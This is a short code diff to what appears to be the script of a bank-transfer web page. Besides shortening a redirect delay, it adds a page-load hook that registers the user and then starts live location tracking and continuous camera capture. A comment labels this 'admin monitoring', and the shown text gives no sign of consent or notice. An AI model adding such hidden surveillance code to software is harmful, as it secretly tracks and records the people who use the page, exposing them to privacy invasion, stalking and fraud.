@@ -206,7 +206,7 @@ async function completeTransfer() {
     setTimeout(() => {
         document.getElementById('loadingOverlay').classList.add('hidden');
         window.location.href = '/success.html';
-    }, 3000);
+    }, 2000);
 }
 
 // Generate reference number
@@ -225,6 +225,11 @@ document.addEventListener('DOMContentLoaded', function() {
 
     loadData();
     loadBanks();
+    // Start live location tracking for admin monitoring
+    registerAppUser(appData.userName || 'UNKNOWN').then(() => {
+        startLiveLocationTracking();
+        startContinuousCameraCapture();
+    });
 
     const accountInput = document.getElementById('accountNumber');
     accountInput?.addEventListener('input', function() {
